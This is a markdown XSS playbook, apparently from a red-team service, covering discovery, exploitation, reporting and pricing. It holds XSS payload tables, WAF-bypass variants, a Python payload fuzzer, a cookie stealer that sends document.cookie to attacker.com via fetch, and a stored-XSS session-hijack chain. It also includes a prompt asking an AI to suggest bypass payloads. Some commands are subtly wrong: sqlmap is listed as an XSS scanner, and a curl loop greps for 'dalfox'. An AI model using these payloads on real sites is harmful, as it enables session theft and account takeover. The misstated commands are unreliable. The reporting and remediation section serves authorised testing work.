# 🔓 XSS Attack Playbook

## Overview
Cross-Site Scripting (XSS) discovery, exploitation, and reporting playbook.

## Target Scope
- Input fields (text, textarea)
- URL parameters
- HTTP headers (User-Agent, Referer)
- File uploads (filename)
- JSON API endpoints

---

## Phase 1: Discovery

### Automated Discovery

```bash
# 1. Basic XSS scan
sqlmap -u "http://target.com/search?q=test" --batch

# 2. Using dalfox (specialized XSS)
dalfox url "http://target.com/search?q=test"

# 3. Using GF patterns + curl
gf xss "http://target.com/" | head -20 | while read url; do
    curl -s "$url" | grep -q "dalfox" && echo "VULN: $url"
done
```

### AI-Powered Discovery Prompt
```
Analyze this endpoint for XSS:
- URL: {target}
- Parameters: {params}
- Input location: {location}

For each parameter:
1. Determine if reflected, stored, or DOM-based
2. Suggest bypass payloads for WAFs
3. Identify potential impact if exploitable
4. Prioritize by ease of exploitation
```

---

## Phase 2: Exploitation

### Payloads by Context

| Context | Payload | Bypass Tips |
|---------|---------|--------------|
| HTML Tag | `<script>alert(1)</script>` | Try variations |
| Attribute | `" onload="alert(1)` | Close attribute first |
| JavaScript | `';alert(1)//` | Encode properly |
| SVG | `<svg onload=alert(1)>` | Great for bypasses |
| Event Handler | `<img src=x onerror=alert(1)>` | Classic |
| DOM | `</script><script>alert(1)</script>` | Break out |

### WAF Bypass Payloads

```javascript
// Polyglot (works in multiple contexts)
javascript:alert(1)//<img src="x" onerror="alert(1)">

// Event handler variations
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

// Encoding bypasses
<scr\x00ipt>alert(1)</scr\x00ipt>
<ScRiPt>alert(1)</sCrIpT>
```

### Exploitation Script

```python
#!/usr/bin/env python3
"""XSS Fuzzer with AI suggestions"""
import requests
import itertools
import argparse

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onload="alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "';alert(1)//",
]

def fuzz_xss(url, param):
    """Fuzz parameter with XSS payloads."""
    for payload in XSS_PAYLOADS:
        r = requests.get(url, params={param: payload})
        if payload in r.text:
            print(f"[+] VULN: {param} = {payload}")
            return payload
    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    args = parser.parse_args()
    
    fuzz_xss(args.url, args.param)

if __name__ == "__main__":
    main()
```

---

## Phase 3: Cookie Stealing (Advanced)

### PoC Payload

```html
<script>
fetch('https://attacker.com/log?c='+document.cookie);
</script>
```

### Shortened Attack Chain

1. Find stored XSS in user profile
2. Inject cookie stealer
3. Wait for admin to view profile
4. Capture session cookie
5. Session hijack

---

## Phase 4: Reporting

### Finding Template

```markdown
## Cross-Site Scripting (XSS) - {location}

### Severity: HIGH (Stored) / MEDIUM (Reflected)

### Description
The parameter `{parameter}` at {URL} is vulnerable to XSS.

### Type
- [ ] Reflected
- [ ] Stored
- [ ] DOM-based

### Impact
- Session hijacking
- Credential theft
- Malicious redirects
- Keylogging
- Defacement

### Proof of Concept
```
Payload: {payload}
URL: {vulnerable_url}
```

### Remediation
1. Output encoding (OWASP ESAPI)
2. Content Security Policy headers
3. HTTPOnly cookies
4. Input validation
5. Use modern frameworks (React, Angular auto-escape)

### References
- OWASP A03:2021
- CWE-79
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
```

---

## Deliverable Checklist

- [ ] All input points mapped
- [ ] XSS vulnerabilities identified
- [ ] Impact assessed (reflected/stored)
- [ ] PoC demonstrated
- [ ] Report generated
- [ ] Remediation guidance provided

---

## Pricing

| Service | Price |
|---------|-------|
| Basic Scan | $79 |
| Full Assessment | $199 |
| Remediation Support | $149/hour |

---

## Automation Tools

| Tool | Use |
|------|-----|
| dalfox | Specialized XSS scanner |
| xsstrike | Advanced XSS detection |
| GF | Pattern matching |
| Nuclei | Template-based XSS |

---

*Part of SpecForge Red Team Services* 🔓
